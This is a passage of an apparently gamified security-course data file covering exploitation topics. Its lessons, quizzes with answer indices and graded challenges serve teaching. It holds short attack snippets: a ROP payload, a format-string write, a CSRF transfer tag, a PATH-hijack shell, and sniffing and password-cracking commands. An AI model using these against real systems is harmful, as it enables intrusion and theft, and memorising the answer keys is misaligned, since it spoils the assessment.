        practice: [
          { q: 'What does the strings command do?', choices: ['Encrypts file', 'Shows printable characters', 'Compiles code', 'Runs program'], answerIdx: 1, hint: 'Extracts text.', why: 'strings extracts all printable character sequences from a binary.' },
          { q: 'Which tool shows system calls made by a program?', choices: ['gdb', 'strace', 'objdump', 'strings'], answerIdx: 1, hint: 'Trace system calls.', why: 'strace traces system calls and signals.' },
        ],
        quiz: [
          { q: 'Reverse engineering reconstructs…', choices: ['Broken code', 'Program logic from binaries', 'Source from documentation', 'Networks'], answerIdx: 1, why: 'Reverse engineering understands how compiled programs work without source code.' },
          { q: 'What should you run first on unknown binaries?', choices: ['Execute it', 'strings and file', 'Delete it', 'Email it'], answerIdx: 1, why: 'Start with safe static analysis tools like strings and file before executing.' },
          { q: 'What does strace show?', choices: ['Source code', 'System calls', 'Network traffic', 'User input'], answerIdx: 1, why: 'strace traces system calls made by a program during execution.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Reverse engineer a crackme', timeMin: 40,
          brief: 'You have a password-protected binary. Outline your reverse engineering approach: what tools to use in what order, what to look for, and how to find the password without brute force.',
          requirements: ['tool sequence', 'static analysis steps', 'dynamic analysis steps', 'what to look for', '120+ words'],
          passScore: 70, rewardNim: 4, xp: 140,
          evaluator: { type: 'text', config: { minWords: 110, targetWords: 170, keyConcepts: ['strings', 'gdb', 'objdump', 'strace', 'reverse', 'analysis'], keyConceptRatio: 0.5, headings: 2 } },
        },
      },
      {
        slug: 'buffer-overflow-intro', title: 'Buffer Overflow Introduction', estMin: 40, difficulty: 2,
        lesson: {
          tldr: 'Buffer overflows occur when writing past allocated memory, potentially overwriting return addresses and hijacking control flow.',
          sections: [
            { h: 'Stack layout', body: 'Stack grows downward. Local buffers → saved rbp → return address. Overflow a buffer, overwrite the return address, redirect execution.' },
            { h: 'Dangerous functions', body: 'gets() has no bounds. strcpy() doesn\'t check size. scanf("%s") is vulnerable. Use fgets(), strncpy(), snprintf() with size limits.' },
            { h: 'Exploitation basics', body: 'Calculate offset to return address. Craft payload: padding + new return address. When function returns, jumps to your address.' },
          ],
          example: { lang: 'c', code: '// Vulnerable\nvoid vuln() {\n    char buffer[64];\n    gets(buffer);  // NO BOUNDS CHECK!\n}\n\n// Stack before overflow:\n// [buffer(64)][rbp(8)][ret_addr(8)]\n\n// Overflow with 100 A\'s:\n// [AAAA...AAAA][AAAA][AAAA]\n// Return address overwritten!' },
          ask: 'What happens when a function returns to an overwritten address?',
          keyPoints: ['Buffer → saved rbp → return address on stack', 'Overflow writes past buffer boundaries', 'Overwriting return address redirects execution', 'Modern protections: stack canaries, ASLR, NX'],
          misconception: '"Modern systems prevent all overflows." Protections exist but can be bypassed with the right techniques.',
        },
        practice: [
          { q: 'What does NX protection do?', choices: ['Encrypts stack', 'Makes stack non-executable', 'Adds checksums', 'Randomizes addresses'], answerIdx: 1, hint: 'No eXecute.', why: 'NX marks stack as non-executable, preventing direct shellcode execution.' },
          { q: 'What\'s a stack canary?', choices: ['A bird', 'Random value before return address', 'Stack size limit', 'CPU feature'], answerIdx: 1, hint: 'Integrity check.', why: 'Canary is a random value placed before return address — checked before returning.' },
        ],
        quiz: [
          { q: 'Buffer overflows occur when…', choices: ['Program runs slowly', 'Writing past allocated memory', 'Reading files', 'Using encryption'], answerIdx: 1, why: 'Buffer overflow means writing more data than allocated, overwriting adjacent memory.' },
          { q: 'What\'s dangerous about overwriting the return address?', choices: ['Program crashes', 'Redirects execution flow', 'Uses more memory', 'Nothing'], answerIdx: 1, why: 'Overwriting return address lets attackers control where the program jumps next.' },
          { q: 'What does a stack canary detect?', choices: ['Viruses', 'Buffer overflows', 'Network attacks', 'SQL injection'], answerIdx: 1, why: 'Canaries detect stack corruption from buffer overflows before return.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Buffer overflow analysis', timeMin: 40,
          brief: 'Given a 64-byte buffer, explain: the exact offset to the return address, how to calculate it, what payload structure is needed, and what modern protections might prevent exploitation.',
          requirements: ['offset calculation', 'payload structure', 'stack layout', 'modern protections', '120+ words'],
          passScore: 70, rewardNim: 4, xp: 150,
          evaluator: { type: 'text', config: { minWords: 110, targetWords: 170, keyConcepts: ['buffer', 'overflow', 'return', 'stack', 'offset', 'payload'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'network-traffic-analysis', title: 'Network Traffic Analysis', estMin: 35, difficulty: 2,
        lesson: {
          tldr: 'Analyzing network packets reveals communications, credentials, and attack patterns.',
          sections: [
            { h: 'Packet capture', body: 'tcpdump captures packets. Wireshark provides GUI analysis. Requires appropriate permissions. Promiscuous mode captures all traffic, not just yours.' },
            { h: 'Protocol analysis', body: 'HTTP shows plaintext data. FTP sends passwords in clear. Telnet is entirely unencrypted. TLS/SSL encrypts at transport layer — can\'t see content.' },
            { h: 'Finding secrets', body: 'Filter for HTTP POST (often passwords), FTP (USER/PASS commands), POP3/SMTP (email passwords). Look for base64-encoded auth headers.' },
          ],
          example: { lang: 'bash', code: '# Capture traffic\nsudo tcpdump -i eth0 -w capture.pcap\n\n# Read capture\ntcpdump -r capture.pcap\n\n# Filter by port\ntcpdump -r capture.pcap \'tcp port 80\'\n\n# Look for passwords\ntcpdump -r capture.pcap -A | grep -i password\n\n# In Wireshark:\n# http.request.method == "POST"\n# Follow TCP Stream for full conversation' },
          ask: 'Can you see HTTPS content in packet captures?',
          keyPoints: ['Unencrypted protocols expose credentials', 'Packet capture requires root/admin', 'Wireshark makes analysis much easier', 'HTTPS prevents content inspection'],
          misconception: '"VPNs make me invisible." VPN endpoint sees everything — just changes who can intercept.',
        },
        practice: [
          { q: 'Which tool provides a GUI for packet analysis?', choices: ['tcpdump', 'Wireshark', 'netstat', 'nmap'], answerIdx: 1, hint: 'Graphical tool.', why: 'Wireshark is the standard GUI tool for packet analysis.' },
          { q: 'Can you read HTTPS content in packet captures?', choices: ['Yes, always', 'No, it\'s encrypted', 'Only with server key', 'Yes, with Wireshark'], answerIdx: 1, hint: 'TLS encryption.', why: 'HTTPS encrypts the content — you only see encrypted data.' },
        ],
        quiz: [
          { q: 'What tool provides GUI for packet analysis?', choices: ['tcpdump', 'Wireshark', 'nmap', 'netcat'], answerIdx: 1, why: 'Wireshark is the standard graphical tool for analyzing network packets.' },
          { q: 'Can you read HTTPS content in Wireshark?', choices: ['Yes, always', 'No, it\'s encrypted', 'Only as admin', 'With special plugins'], answerIdx: 1, why: 'HTTPS encrypts content — you only see encrypted payload, not the actual data.' },
          { q: 'What protocol sends passwords in cleartext?', choices: ['HTTPS', 'SSH', 'FTP', 'TLS'], answerIdx: 2, why: 'FTP sends credentials unencrypted, visible in packet captures.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Packet analysis', timeMin: 35,
          brief: 'Explain how to: capture HTTP traffic on port 80, filter for POST requests, extract credentials from unencrypted traffic, and explain why HTTPS prevents this attack.',
          requirements: ['capture command', 'filter syntax', 'credential extraction', 'HTTPS explanation', '100+ words'],
          passScore: 70, rewardNim: 3, xp: 130,
          evaluator: { type: 'text', config: { minWords: 90, targetWords: 150, keyConcepts: ['tcpdump', 'packet', 'http', 'https', 'filter', 'capture'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'password-security', title: 'Password Security', estMin: 35, difficulty: 2,
        lesson: {
          tldr: 'Weak passwords can be cracked offline — proper hashing and complexity requirements are essential.',
          sections: [
            { h: 'Attack types', body: 'Brute force (try all combinations), dictionary (common words), rainbow tables (precomputed hashes). GPUs make these extremely fast.' },
            { h: 'Hash functions', body: 'MD5/SHA1 are fast — bad for passwords. bcrypt/scrypt/Argon2 are intentionally slow — resist brute force. Always salt hashes.' },
            { h: 'Password complexity', body: 'Length > complexity. "correct horse battery staple" beats "P@ssw0rd". 12+ characters, unpredictable. Use password managers.' },
          ],
          example: { lang: 'bash', code: '# MD5 (fast, bad for passwords)\necho -n "password" | md5sum\n\n# SHA256 (better but still fast)\necho -n "password" | sha256sum\n\n# bcrypt (slow, good)\n# htpasswd -bnBC 10 "" password | tr -d \':\'\n\n# John the Ripper (password cracker)\njohn --wordlist=rockyou.txt hashes.txt\n\n# Hashcat (GPU-accelerated)\nhashcat -m 0 -a 0 hash.txt wordlist.txt' },
          ask: 'Why is bcrypt better than MD5 for password storage?',
          keyPoints: ['Fast hashes = fast cracking', 'Salt prevents rainbow tables', 'Length matters more than complexity', 'bcrypt/scrypt resist brute force'],
          misconception: '"Complex passwords can\'t be cracked." Given enough time and compute, any password can be cracked.',
        },
        practice: [
          { q: 'What does salting a password hash prevent?', choices: ['Brute force', 'Rainbow table attacks', 'Dictionary attacks', 'All attacks'], answerIdx: 1, hint: 'Precomputed hashes.', why: 'Salt makes rainbow tables (precomputed hashes) useless.' },
          { q: 'Which is better for passwords?', choices: ['MD5', 'SHA256', 'bcrypt', 'All equal'], answerIdx: 2, hint: 'Intentionally slow.', why: 'bcrypt is designed to be slow, resisting brute force attacks.' },
        ],
        quiz: [
          { q: 'Why is bcrypt better than MD5 for passwords?', choices: ['Faster', 'Intentionally slow', 'Shorter hashes', 'More popular'], answerIdx: 1, why: 'bcrypt is designed to be slow, making brute force attacks impractical.' },
          { q: 'What does salt prevent?', choices: ['Brute force', 'Rainbow table attacks', 'Network attacks', 'All attacks'], answerIdx: 1, why: 'Salt defeats precomputed rainbow tables by making each hash unique.' },
          { q: 'What matters more for password strength?', choices: ['Complexity', 'Length', 'Special characters', 'Numbers'], answerIdx: 1, why: 'Length increases combinations exponentially; a long simple phrase beats short complex one.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Password cracking', timeMin: 35,
          brief: 'Explain: How rainbow tables work, why salt defeats them, the difference between MD5 and bcrypt for passwords, and what makes a strong password in 2026.',
          requirements: ['rainbow table explained', 'salt mechanism', 'MD5 vs bcrypt', 'strong password criteria', '120+ words'],
          passScore: 70, rewardNim: 3, xp: 130,
          evaluator: { type: 'text', config: { minWords: 110, targetWords: 170, keyConcepts: ['rainbow', 'salt', 'hash', 'bcrypt', 'password', 'crack'], keyConceptRatio: 0.5, headings: 2 } },
        },
      },
      /* ══════ LEVEL 3: INTERMEDIATE ══════ */
      {
        slug: 'advanced-buffer-exploits', title: 'Advanced Buffer Exploits', estMin: 45, difficulty: 3,
        lesson: {
          tldr: 'Return-Oriented Programming (ROP) chains existing code to bypass NX protection.',
          sections: [
            { h: 'The NX problem', body: 'NX marks stack non-executable — can\'t run injected shellcode. Solution: use existing code. ROP chains short code sequences (gadgets) ending in ret.' },
            { h: 'Finding gadgets', body: 'Gadgets: "pop rdi; ret", "pop rsi; ret". Tools like ROPgadget find them. Chain gadgets to set registers, call functions.' },
            { h: 'Building chains', body: 'Each gadget pops values from stack into registers, then rets to next. Carefully stack addresses and values to execute desired sequence.' },
          ],
          example: { lang: 'python', code: '# ROP chain concept\npayload = b\'A\' * 72  # Fill buffer\n\n# Gadget 1: pop rdi; ret\npayload += p64(0x401234)  # Address of gadget\npayload += p64(0x404040)  # Value to pop into rdi\n\n# Gadget 2: pop rsi; ret\npayload += p64(0x401236)\npayload += p64(0x0)\n\n# Call system()\npayload += p64(0x401000)  # system@plt' },
          ask: 'Why do ROP gadgets need to end with ret?',
          keyPoints: ['NX prevents executing stack data', 'ROP uses existing code (gadgets)', 'Gadgets end in ret to chain', 'ASLR makes addresses unpredictable — need leaks'],
          misconception: '"NX prevents all code execution exploits." ROP bypasses NX by reusing existing code.',
        },
        practice: [
          { q: 'What is a ROP gadget?', choices: ['A tool', 'Short code sequence ending in ret', 'A buffer', 'A vulnerability'], answerIdx: 1, hint: 'Code snippet.', why: 'Gadgets are short instruction sequences in the binary ending with ret.' },
          { q: 'Why does ASLR make ROP harder?', choices: ['Makes gadgets disappear', 'Randomizes addresses', 'Enables NX', 'Nothing'], answerIdx: 1, hint: 'Address randomization.', why: 'ASLR randomizes memory addresses, so you need to leak addresses first.' },
        ],
        quiz: [
          { q: 'ROP stands for…', choices: ['Reverse Overflow Protection', 'Return-Oriented Programming', 'Remote Operation Protocol', 'Read-Only Protection'], answerIdx: 1, why: 'ROP = Return-Oriented Programming, chaining existing code.' },
          { q: 'Why use ROP when NX is enabled?', choices: ['It\'s faster', 'NX prevents stack execution, ROP uses existing code', 'ROP is easier', 'No reason'], answerIdx: 1, why: 'NX marks stack non-executable, so ROP reuses existing executable code instead.' },
          { q: 'What are ROP gadgets?', choices: ['Tools', 'Code sequences ending in ret', 'Vulnerabilities', 'Exploits'], answerIdx: 1, why: 'Gadgets are short instruction sequences in the binary ending with ret.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'ROP chain design', timeMin: 45,
          brief: 'Design a ROP chain to call system("/bin/sh"). Assume you have: pop_rdi gadget at 0x401234, system() at 0x401000, "/bin/sh" string at 0x404040. Show payload structure.',
          requirements: ['gadget addresses', 'payload structure', 'register setup', 'call sequence', '130+ words'],
          passScore: 75, rewardNim: 5, xp: 160,
          evaluator: { type: 'text', config: { minWords: 120, targetWords: 180, keyConcepts: ['rop', 'gadget', 'payload', 'register', 'system', 'chain'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'format-string-vulns', title: 'Format String Vulnerabilities', estMin: 40, difficulty: 3,
        lesson: {
          tldr: 'Format string bugs allow reading and writing arbitrary memory through printf-family functions.',
          sections: [
            { h: 'The vulnerability', body: 'printf(user_input) is dangerous. Format specifiers (%x, %s, %n) operate on stack. Attacker controls format string, can read/write memory.' },
            { h: 'Reading memory', body: '%x reads hex values from stack. %s dereferences pointers. Direct parameter access: %7$x reads 7th stack value. Leak addresses, canaries, data.' },
            { h: 'Writing memory', body: '%n writes bytes printed so far to address. Craft format string to write specific values to arbitrary addresses. Can overwrite GOT, return addresses.' },
          ],
          example: { lang: 'c', code: '// Vulnerable\nprintf(user_input);  // WRONG\n\n// Safe\nprintf("%s", user_input);  // Correct\n\n// Exploit\n// Read stack\nAAAA %p %p %p\n// If AAAA appears as 0x41414141, found offset\n\n// Write to 0x08040000\n\\x00\\x40\\x04\\x08%100x%7$n\n// Writes 104 to 0x08040000' },
          ask: 'What does %n do in a format string?',
          keyPoints: ['Never printf(user_input)', '%n writes bytes printed', 'Direct parameter access: %7$x', 'Can leak addresses and write memory'],
          misconception: '"Only printf is vulnerable." sprintf, fprintf, snprintf with user-controlled format are all vulnerable.',
        },
        practice: [
          { q: 'What does %n do?', choices: ['Prints number', 'Writes bytes printed so far', 'Reads address', 'Nothing'], answerIdx: 1, hint: 'Write operation.', why: '%n writes the number of bytes printed so far to the address on stack.' },
          { q: 'Is printf("%s", input) vulnerable to format string attacks?', choices: ['Yes', 'No', 'Sometimes', 'Only in C++'], answerIdx: 1, hint: 'Format is controlled by you.', why: 'Safe because format string is not user-controlled.' },
        ],
        quiz: [
          { q: 'Format string bugs occur in…', choices: ['SQL queries', 'printf-family functions', 'File operations', 'Network sockets'], answerIdx: 1, why: 'printf, fprintf, sprintf, etc. are vulnerable when format string is user-controlled.' },
          { q: 'What does %n do?', choices: ['Reads integer', 'Writes bytes printed so far', 'Prints newline', 'Nothing'], answerIdx: 1, why: '%n writes the number of bytes printed so far to memory address on stack.' },
          { q: 'Format strings can…', choices: ['Only read memory', 'Only write memory', 'Read and write memory', 'Do nothing dangerous'], answerIdx: 2, why: 'Format strings can both read (%x, %s) and write (%n) arbitrary memory.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Format string exploitation', timeMin: 40,
          brief: 'Explain: How to use format strings to leak a stack canary, how to write a specific value to an address using %n, and why this is more powerful than simple buffer overflows.',
          requirements: ['canary leak technique', '%n write mechanism', 'arbitrary write explained', 'power comparison', '130+ words'],
          passScore: 75, rewardNim: 5, xp: 160,
          evaluator: { type: 'text', config: { minWords: 120, targetWords: 180, keyConcepts: ['format', 'printf', '%n', 'write', 'leak', 'stack'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'web-session-attacks', title: 'Web Session Attacks', estMin: 40, difficulty: 3,
        lesson: {
          tldr: 'CSRF tricks users into performing actions, session hijacking steals authentication tokens.',
          sections: [
            { h: 'Cross-Site Request Forgery', body: 'CSRF exploits browser\'s automatic cookie sending. Victim\'s browser makes authenticated request to vulnerable site. Use CSRF tokens to prevent.' },
            { h: 'Session hijacking', body: 'Steal session cookie via XSS, packet sniffing, or MitM. Attacker uses stolen cookie to impersonate victim. HttpOnly flag prevents JavaScript access.' },
            { h: 'Defense mechanisms', body: 'CSRF tokens (random, per-request), SameSite cookie attribute, check Referer header. For sessions: HttpOnly, Secure, short timeouts, IP binding.' },
          ],
          example: { lang: 'html', code: '<!-- CSRF attack -->\n<img src="https://bank.com/transfer?to=attacker&amount=1000">\n<!-- Victim\'s browser sends cookies automatically -->\n\n<!-- Prevention: CSRF token -->\n<form>\n  <input type="hidden" name="csrf" value="random_token">\n  <!-- Server validates token -->\n</form>\n\n<!-- Session cookie flags -->\nSet-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict' },
          ask: 'Why does CSRF work even though you can\'t read the response?',
          keyPoints: ['CSRF exploits automatic cookie sending', 'Doesn\'t need to read response — action still happens', 'CSRF tokens prevent attacks', 'HttpOnly protects against XSS-based hijacking'],
          misconception: '"HTTPS prevents CSRF." HTTPS encrypts transport but doesn\'t validate request origin.',
        },
        practice: [
          { q: 'What prevents CSRF attacks?', choices: ['HTTPS', 'CSRF tokens', 'Strong passwords', 'HttpOnly'], answerIdx: 1, hint: 'Random per-request value.', why: 'CSRF tokens are random values that attackers can\'t predict.' },
          { q: 'What does HttpOnly cookie flag do?', choices: ['Encrypts cookie', 'Prevents JavaScript access', 'Makes cookie public', 'Nothing'], answerIdx: 1, hint: 'XSS protection.', why: 'HttpOnly prevents JavaScript from accessing the cookie, mitigating XSS.' },
        ],
        quiz: [
          { q: 'CSRF exploits…', choices: ['SQL databases', 'Automatic cookie sending', 'Encryption', 'Firewalls'], answerIdx: 1, why: 'CSRF works because browsers automatically send cookies with requests.' },
          { q: 'What prevents CSRF?', choices: ['HTTPS', 'CSRF tokens', 'Strong passwords', 'Firewall'], answerIdx: 1, why: 'CSRF tokens are unpredictable values that attackers cannot forge.' },
          { q: 'Session hijacking steals…', choices: ['Passwords', 'Session cookies', 'Credit cards', 'Emails'], answerIdx: 1, why: 'Session hijacking involves stealing session cookies to impersonate victims.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Session security analysis', timeMin: 40,
          brief: 'Compare CSRF and session hijacking: how they work, what they achieve, how to defend against each. Include example attack scenarios and mitigation techniques.',
          requirements: ['CSRF explained', 'session hijacking explained', 'attack scenarios', 'defenses for both', '140+ words'],
          passScore: 75, rewardNim: 5, xp: 160,
          evaluator: { type: 'text', config: { minWords: 130, targetWords: 190, keyConcepts: ['csrf', 'session', 'cookie', 'token', 'hijack', 'httponly'], keyConceptRatio: 0.5, headings: 2 } },
        },
      },
      {
        slug: 'privilege-escalation', title: 'Privilege Escalation', estMin: 45, difficulty: 3,
        lesson: {
          tldr: 'Privilege escalation exploits misconfigurations to gain root access from unprivileged accounts.',
          sections: [
            { h: 'Finding vectors', body: 'Check sudo permissions (sudo -l), SUID binaries (find / -perm -4000), world-writable files, cron jobs, PATH hijacking opportunities.' },
            { h: 'SUID exploitation', body: 'SUID programs run with owner\'s privileges. If owned by root and vulnerable (buffer overflow, command injection), can get root shell.' },
            { h: 'Sudo misconfigurations', body: 'Sudo rules without NOPASSWD, wildcards in paths, dangerous commands allowed. Example: sudo vim allows :!sh to get root shell.' },
          ],
          example: { lang: 'bash', code: '# Enumeration\nsudo -l  # Check sudo permissions\nfind / -perm -4000 2>/dev/null  # SUID binaries\nfind / -writable -type f 2>/dev/null  # Writable files\ncrontab -l  # Cron jobs\n\n# PATH hijacking\n# If script runs "ls" without full path\necho \'#!/bin/bash\n/bin/bash\' > /tmp/ls\nchmod +x /tmp/ls\nexport PATH=/tmp:$PATH' },
          ask: 'What makes a SUID binary dangerous?',
          keyPoints: ['Enumeration is key — find the weakness', 'SUID + vulnerability = root', 'Sudo misconfigurations are common', 'Always check for world-writable cron jobs'],
          misconception: '"Kernel exploits are the only way." Misconfiguration is much more common than kernel bugs.',
        },
        practice: [
          { q: 'What does sudo -l show?', choices: ['System logs', 'Allowed sudo commands', 'SUID files', 'Running processes'], answerIdx: 1, hint: 'Permissions check.', why: 'sudo -l lists commands the current user can run with sudo.' },
          { q: 'SUID bit makes programs run as?', choices: ['Current user', 'Nobody', 'File owner', 'Root always'], answerIdx: 2, hint: 'Owner\'s privileges.', why: 'SUID programs run with the permissions of the file owner.' },
        ],
        quiz: [
          { q: 'Privilege escalation aims to get…', choices: ['More memory', 'Root/admin access', 'Faster speed', 'More storage'], answerIdx: 1, why: 'Privilege escalation gains higher permissions, typically root/administrator.' },
          { q: 'What makes SUID binaries potentially dangerous?', choices: ['Size', 'Run as owner, not current user', 'Speed', 'Color'], answerIdx: 1, why: 'SUID binaries run with owner permissions — if owner is root and there\'s a bug, you get root.' },
          { q: 'What does sudo -l show?', choices: ['System logs', 'Commands you can run as root', 'Network connections', 'Running processes'], answerIdx: 1, why: 'sudo -l lists which commands the current user can execute with sudo.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Privilege escalation assessment', timeMin: 45,
          brief: 'Outline a privilege escalation methodology: enumeration steps, what to look for, three different privilege escalation techniques, and how to prevent these attacks.',
          requirements: ['enumeration checklist', 'SUID explanation', 'sudo exploitation', 'prevention measures', '150+ words'],
          passScore: 75, rewardNim: 5, xp: 170,
          evaluator: { type: 'text', config: { minWords: 140, targetWords: 200, keyConcepts: ['privilege', 'escalation', 'suid', 'sudo', 'root', 'enumeration'], keyConceptRatio: 0.5, headings: 2 } },
        },
      },
      {
        slug: 'advanced-crypto', title: 'Advanced Cryptography', estMin: 40, difficulty: 3,
        lesson: {
          tldr: 'Real-world crypto can be attacked through implementation flaws, not just mathematical weaknesses.',
          sections: [
            { h: 'Block cipher modes', body: 'ECB mode is broken (same plaintext = same ciphertext). CBC is better but needs random IV. Padding oracle attacks exploit CBC. Use AES-GCM for authenticated encryption.' },
            { h: 'RSA attacks', body: 'Small exponents can be attacked. Weak keys (p and q too close) can be factored. Padding schemes matter (PKCS#1 v1.5 has issues). Always use proper key sizes (2048+ bits).' },
            { h: 'TLS/SSL attacks', body: 'BEAST, CRIME, POODLE exploit protocol flaws. SSL is broken, use TLS 1.2+. Certificate validation is critical — MitM attacks exploit improper validation.' },
          ],
          example: { lang: 'python', code: '# ECB mode reveals patterns\n# Same plaintext blocks = same ciphertext\n# Can detect repeated data\n\n# Padding oracle\n# Server reveals if padding is valid\n# Decrypt one byte at a time\n\n# Weak RSA\nimport gmpy2\n# If p and q are close, can factor n\np_q_diff = abs(p - q)\nif p_q_diff < 2^256:\n    # Vulnerable to Fermat factorization' },
          ask: 'Why is ECB mode insecure for images?',
          keyPoints: ['Implementation flaws often more exploitable than math', 'ECB mode reveals patterns in data', 'Padding oracles allow decryption', 'Certificate validation prevents MitM'],
          misconception: '"Strong algorithms mean secure systems." Implementation and configuration matter more than algorithm choice.',
        },
        practice: [
          { q: 'What\'s wrong with ECB mode?', choices: ['Too slow', 'Reveals patterns', 'Weak encryption', 'Nothing'], answerIdx: 1, hint: 'Deterministic.', why: 'ECB encrypts identical blocks identically, revealing patterns.' },
          { q: 'What makes TLS more secure than SSL?', choices: ['Faster', 'Newer protocol fixes vulnerabilities', 'Longer keys', 'Better UI'], answerIdx: 1, hint: 'Protocol improvements.', why: 'TLS fixed various SSL vulnerabilities — SSL is deprecated.' },
        ],
        quiz: [
          { q: 'What\'s wrong with ECB mode?', choices: ['Too slow', 'Reveals patterns in data', 'Too complex', 'Nothing'], answerIdx: 1, why: 'ECB encrypts identical blocks identically, revealing patterns in plaintext.' },
          { q: 'Padding oracle attacks exploit…', choices: ['Weak passwords', 'Invalid padding errors', 'Slow encryption', 'Key size'], answerIdx: 1, why: 'Padding oracles leak information through error messages about padding validity.' },
          { q: 'What should you use instead of SSL?', choices: ['HTTP', 'TLS 1.2+', 'FTP', 'Telnet'], answerIdx: 1, why: 'SSL is deprecated and vulnerable; use TLS 1.2 or higher.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Cryptographic vulnerability analysis', timeMin: 40,
          brief: 'Explain: Why ECB mode is insecure (with example), how padding oracle attacks work, and what makes a TLS configuration secure in 2026.',
          requirements: ['ECB weakness', 'padding oracle concept', 'TLS best practices', 'examples', '140+ words'],
          passScore: 75, rewardNim: 5, xp: 160,
          evaluator: { type: 'text', config: { minWords: 130, targetWords: 190, keyConcepts: ['ecb', 'padding', 'oracle', 'tls', 'crypto', 'cipher'], keyConceptRatio: 0.5, headings: 2 } },
        },
      },
      {
        slug: 'binary-exploitation', title: 'Binary Exploitation', estMin: 45, difficulty: 3,
        lesson: {
          tldr: 'Beyond the stack — heap exploitation, integer overflows, and use-after-free vulnerabilities.',
          sections: [
            { h: 'Heap exploitation', body: 'Heap stores dynamically allocated memory. Use-after-free: access freed memory. Double-free: free same memory twice. Heap corruption can overwrite malloc metadata.' },
            { h: 'Integer vulnerabilities', body: 'Integer overflow wraps around (255 + 1 = 0 for unsigned char). Can bypass size checks. Example: malloc(len + 10) where len overflows.' },
            { h: 'Race conditions', body: 'Time-of-check vs time-of-use (TOCTOU). Check permissions, attacker changes file before use. Symlink races are common.' },
          ],
          example: { lang: 'c', code: '// Use-after-free\nchar *ptr = malloc(100);\nfree(ptr);\nstrcpy(ptr, input);  // Writes to freed memory!\n\n// Integer overflow\nunsigned int len = user_input;\nif (len < 1000) {  // Check passes\n  char *buf = malloc(len + 10);  // But len+10 might wrap!\n  memcpy(buf, data, len);  // Buffer overflow\n}\n\n// TOCTOU race\nif (access("file", W_OK) == 0) {  // Check\n  // Attacker replaces file here!\n  fd = open("file", O_WRONLY);  // Use different file\n}' },
          ask: 'What\'s dangerous about use-after-free?',
          keyPoints: ['Heap exploitation is complex but powerful', 'Integer overflows bypass size checks', 'Race conditions exploit timing windows', 'Modern allocators have protections'],
          misconception: '"Heap exploits are too advanced to worry about." They\'re found in the wild regularly.',
        },
        practice: [
          { q: 'What happens when unsigned int overflows?', choices: ['Crash', 'Error', 'Wraps to 0', 'Becomes negative'], answerIdx: 2, hint: 'Modulo arithmetic.', why: 'Unsigned integers wrap around: MAX + 1 = 0.' },
          { q: 'What is TOCTOU?', choices: ['A tool', 'Time-of-check time-of-use race', 'A protocol', 'An encryption'], answerIdx: 1, hint: 'Race condition.', why: 'TOCTOU is a race between checking something and using it.' },
        ],
        quiz: [
          { q: 'Use-after-free means…', choices: ['Free RAM', 'Accessing freed memory', 'Free software', 'Memory leak'], answerIdx: 1, why: 'Use-after-free accesses memory after it\'s been freed, causing undefined behavior.' },
          { q: 'Integer overflow happens when…', choices: ['Too many integers', 'Value exceeds max', 'Division by zero', 'Negative numbers'], answerIdx: 1, why: 'Integer overflow occurs when a value exceeds the maximum for its type and wraps around.' },
          { q: 'TOCTOU stands for…', choices: ['Time Of Check, Time Of Use', 'Type Of Control Transfer', 'Total Computer Usage', 'Two-factor Authentication'], answerIdx: 0, why: 'TOCTOU = Time Of Check, Time Of Use — a race condition vulnerability.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Advanced binary vulnerabilities', timeMin: 45,
          brief: 'Explain three vulnerability classes: use-after-free, integer overflow, and TOCTOU. For each: how it occurs, exploitation scenario, and mitigation technique.',
          requirements: ['use-after-free explained', 'integer overflow explained', 'TOCTOU explained', 'mitigations for each', '160+ words'],
          passScore: 75, rewardNim: 5, xp: 170,
          evaluator: { type: 'text', config: { minWords: 150, targetWords: 210, keyConcepts: ['heap', 'integer', 'overflow', 'race', 'toctou', 'use-after-free'], keyConceptRatio: 0.5, headings: 3 } },
        },
      },
      {
        slug: 'system-security', title: 'System Security', estMin: 40, difficulty: 3,
        lesson: {
          tldr: 'System hardening combines multiple defensive layers to increase attack difficulty.',
          sections: [
            { h: 'Security features', body: 'ASLR randomizes addresses. DEP/NX prevents execution. Stack canaries detect overflows. RELRO protects GOT. Seccomp filters syscalls. Layered defense.' },
            { h: 'Kernel basics', body: 'Kernel has highest privileges (ring 0). Syscalls are the interface. Kernel exploits are rare but devastating. SELinux/AppArmor provide mandatory access control.' },
            { h: 'Hardening practices', body: 'Remove unnecessary services. Principle of least privilege. Keep systems updated. Monitor logs. Use firewalls. Defense in depth: no single point of failure.' },
          ],
          example: { lang: 'bash', code: '# Check security features\nchecksec --file=/bin/ls\n\n# ASLR status\ncat /proc/sys/kernel/randomize_va_space\n\n# SELinux status\ngetenforce\n\n# Restrict syscalls with seccomp\n# (in code, not shell)\n# prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);\n\n# Firewall rules\nsudo iptables -L\nsudo ufw status' },
          ask: 'Why is ASLR effective against exploits?',
          keyPoints: ['Multiple protections layer together', 'No single protection is perfect', 'Kernel security is critical', 'Monitoring and logging detect attacks'],
          misconception: '"One protection makes you secure." Defense in depth — multiple layers are essential.',
        },
        practice: [
          { q: 'What does ASLR do?', choices: ['Encrypts memory', 'Randomizes addresses', 'Logs attacks', 'Blocks ports'], answerIdx: 1, hint: 'Address Space...', why: 'ASLR randomizes memory addresses, making exploits harder.' },
          { q: 'What privilege level does the kernel run at?', choices: ['User (ring 3)', 'Kernel (ring 0)', 'Driver (ring 2)', 'Application (ring 4)'], answerIdx: 1, hint: 'Highest privilege.', why: 'Kernel runs at ring 0 with full hardware access.' },
        ],
        quiz: [
